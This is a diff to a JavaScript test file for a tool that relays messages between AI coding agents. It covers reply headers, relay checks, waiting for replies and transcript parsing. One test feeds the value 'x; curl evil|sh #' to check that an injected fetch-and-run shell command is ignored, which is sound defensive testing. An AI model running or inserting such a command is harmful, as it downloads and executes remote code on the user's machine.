@@ -16,8 +16,9 @@ const { waitForReply } = await import('../lib/desktop.js');
 
 test('header tells the receiver who wrote, from where, and how to reply', () => {
   assert.equal(core.header({ agent: 'claude', name: 'API review' }), `[crosstalk] From Claude, session 'API review'. Reply with: crosstalk send claude 'API review' '<reply>'`);
-  assert.equal(core.header({ agent: 'codex', id: 'abc', name: 'Fix login' }), `[crosstalk] From Codex, thread 'Fix login'. Reply with: crosstalk send codex abc '<reply>'`);
-  assert.equal(core.header({ agent: 'antigravity', id: null, name: 'Antigravity' }), `[crosstalk] From Antigravity. Reply with: crosstalk send antigravity current '<reply>'`);
+  assert.equal(core.header({ agent: 'codex', id: 'abc', name: 'Fix login' }), `[crosstalk] From Codex, thread 'Fix login'. Reply with: crosstalk send codex 'abc' '<reply>'`);
+  assert.equal(core.header({ agent: 'antigravity', id: 'abc', name: 'Background session' }), `[crosstalk] From Antigravity, conversation 'Background session'. Reply with: crosstalk send antigravity 'abc' '<reply>'`);
+  assert.equal(core.header({ agent: 'antigravity', id: null, name: 'Antigravity' }), `[crosstalk] From Antigravity. Reply with: crosstalk send user '<reply>'`);
   assert.match(core.header({ agent: 'terminal', name: 'terminal' }), /^\[crosstalk\] From a terminal \(sender not verified\)\. Reply with: crosstalk send user/);
   assert.match(core.header({ agent: 'user', name: 'you' }), /^\[crosstalk\] From the user, in the crosstalk room\./);
   assert.equal(core.header({ agent: 'claude', name: 'Lead' }, true), `[crosstalk] From Claude, session 'Lead'. It is waiting: just answer in this chat.`);
@@ -29,7 +30,7 @@ test('a session name cannot inject shell code into the reply command', () => {
 });
 
 test('--from is used only when it is a conversation id', () => {
-  assert.equal(core.whoami('x; curl evil|sh #').id ?? null, process.env.CLAUDE_CODE_SESSION_ID ? core.whoami().id : null);
+  assert.deepEqual(core.whoami('x; curl evil|sh #'), core.whoami());
 });
 
 test('sending to the room logs the message', async () => {
@@ -58,14 +59,22 @@ test('Antigravity targets: exact title wins, ambiguity is refused', () => {
 
 test('the relay must make exactly the one requested SendMessage call', () => {
   const call = (input, id = 't1') => JSON.stringify({ type: 'assistant', message: { content: [{ type: 'tool_use', id, name: 'SendMessage', input }] } });
-  const result = (id = 't1', is_error = false) => JSON.stringify({ type: 'user', message: { content: [{ type: 'tool_result', tool_use_id: id, is_error, content: 'ok' }] } });
+  const result = ({ success = true, is_error = false } = {}) => {
+    const content = [{ type: 'text', text: JSON.stringify({ success, message: success ? 'in the inbox, not yet read' : 'No agent is reachable' }) }];
+    return JSON.stringify({ type: 'user', message: { content: [{ type: 'tool_result', tool_use_id: 't1', is_error, content }] } });
+  };
+  const notice = (content) => JSON.stringify({ type: 'system', subtype: 'informational', content });
   const good = { to: 'S', message: 'hello' };
-  assert.equal(checkRelay([call(good), result()].join('\n'), 'S', 'hello'), null);
-  assert.equal(checkRelay([call(good), call(good), result()].join('\n'), 'S', 'hello'), null); // the same call streamed twice
-  assert.match(checkRelay([call(good), call(good, 't2'), result()].join('\n'), 'S', 'hello'), /saw 2/);
-  assert.match(checkRelay([call({ to: 'S', message: 'other' }), result()].join('\n'), 'S', 'hello'), /changed/);
-  assert.match(checkRelay([call(good), result('t1', true)].join('\n'), 'S', 'hello'), /ok/);
-  assert.match(checkRelay('could not be sent', 'S', 'hello'), /saw 0/);
+  const check = (...frames) => checkRelay(frames.join('\n'), 'S', 'hello');
+  assert.equal(check(call(good), result()), 'submitted');
+  assert.equal(check(call(good), call(good), result()), 'submitted'); // the same call streamed twice
+  assert.equal(check(call(good), result(), notice('Cross-session message held by the receiving session (recipient: @S).')), 'held');
+  assert.throws(() => check(call(good), result(), notice('Cross-session message refused (recipient: @S).')), /refused/);
+  assert.throws(() => check(call(good), result({ success: false })), /No agent is reachable/);
+  assert.throws(() => check(call(good), result({ is_error: true })), /in the inbox/);
+  assert.throws(() => check(call(good), call(good, 't2'), result()), /saw 2/);
+  assert.throws(() => check(call({ to: 'S', message: 'other' }), result()), /changed/);
+  assert.throws(() => check('could not be sent'), /saw 0/);
 });
 
 test('the room refuses other hosts and requests without its token', async () => {
@@ -86,20 +95,35 @@ test('the room refuses other hosts and requests without its token', async () => 
   }
 });
 
-test('--wait returns the new answer once the agent is idle again, and waits while it is off screen', async () => {
-  const frames = [
-    { id: 'other', status: 'idle' }, // the person looked at another conversation
-    { id: 'c1', status: 'busy' },
-    { id: 'c1', status: 'busy' },
-    { id: 'c1', status: 'idle' },
-  ];
-  const fake = { run: async (fn) => (fn === state ? frames.shift() || { id: 'c1', status: 'idle' } : 'new answer') };
-  const state = () => {};
-  const last = () => {};
-  const got = await waitForReply(fake, { id: 'c1', previous: 'old answer', pageState: state, pageLastReply: last, app: 'Codex', timeoutMs: 2000, intervalMs: 5 });
-  assert.equal(got.reply, 'new answer');
-  await assert.rejects(
-    waitForReply({ run: async () => ({ id: 'c1', status: 'waiting', name: 'T', note: "needs the user's approval" }) }, { id: 'c1', previous: '', pageState: state, pageLastReply: last, app: 'Codex', timeoutMs: 100, intervalMs: 5 }),
-    /user's call/,
-  );
+test('--wait finishes when the adapter confirms this message has a reply', async () => {
+  const frames = [null, null, { reply: 'identical to the previous answer' }];
+  const options = { id: 'c1', app: 'Codex', timeoutMs: 200, intervalMs: 2 };
+  const got = await waitForReply(async () => frames.shift(), options);
+  assert.equal(got.reply, 'identical to the previous answer');
+  assert.equal(frames.length, 0);
+  await assert.rejects(waitForReply(async () => null, { ...options, timeoutMs: 12 }), /no confirmed reply/);
+  await assert.rejects(waitForReply(async () => { throw new Error('turn failed'); }, options), /turn failed/);
+});
+
+test('a Claude transcript keeps the user, other agents and Claude, not tools or system notes', async () => {
+  const { parseTranscript } = await import('../lib/claude.js');
+  const line = (o) => JSON.stringify(o);
+  const jsonl = [
+    line({ type: 'user', origin: { kind: 'human' }, timestamp: 't1', message: { content: 'Fix the login<system-reminder>x</system-reminder>' } }),
+    line({ type: 'assistant', message: { id: 'a', content: [{ type: 'text', text: 'On it.' }] } }),
+    line({ type: 'assistant', message: { id: 'a', content: [{ type: 'tool_use', id: 'u1' }] } }),
+    line({ type: 'assistant', message: { id: 'a', content: [{ type: 'text', text: 'Reading auth.js' }] } }),
+    line({ type: 'user', message: { content: [{ type: 'tool_result', tool_use_id: 'u1' }] } }),
+    line({ type: 'user', origin: { kind: 'task-notification' }, message: { content: '<task-notification>done</task-notification>' } }),
+    line({ type: 'user', origin: { kind: 'peer' }, message: { content: 'Another Claude session sent a message:\n<cross-session-message from="x">\n[crosstalk] From Codex. Hi\n</cross-session-message>' } }),
+    line({ type: 'user', isSidechain: true, message: { content: 'subagent prompt' } }),
+    line({ type: 'assistant', message: { id: 'b', content: [{ type: 'text', text: 'Fixed.' }] } }),
+    'not json',
+  ].join('\n');
+  assert.deepEqual(parseTranscript(jsonl).map((m) => [m.role, m.text]), [
+    ['user', 'Fix the login'],
+    ['claude', 'On it.\nReading auth.js'],
+    ['user', '[crosstalk] From Codex. Hi'],
+    ['claude', 'Fixed.'],
+  ]);
 });
